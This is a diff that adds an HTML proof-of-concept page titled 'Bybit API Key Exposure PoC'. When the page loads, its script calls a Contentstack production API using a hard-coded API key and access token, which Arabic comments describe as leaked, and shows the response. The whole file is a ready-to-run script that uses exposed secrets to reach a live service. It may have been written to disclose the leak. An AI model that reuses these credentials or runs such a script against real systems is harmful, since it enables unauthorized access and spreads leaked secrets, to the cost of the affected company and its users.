@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Bybit API Key Exposure PoC</title>
+</head>
+<body>
+  <h2>Bybit API Key Exposure PoC</h2>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    async function testAPI() {
+      try {
+        const res = await fetch("https://cdn.contentstack.io/v3/content_types?environment=production", {
+          method: "GET",
+          headers: {
+            "api_key": "blt8ec5b78e9ea1d11d",   // المفتاح المسرب
+            "access_token": "csc62ab090cedcfd9c7c8bb015", // التوكن المسرب
+            "Content-Type": "application/json"
+          }
+        });
+
+        const data = await res.json();
+        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        document.getElementById("output").textContent = "Error: " + err;
+      }
+    }
+
+    testAPI();
+  </script>
+</body>
+</html>
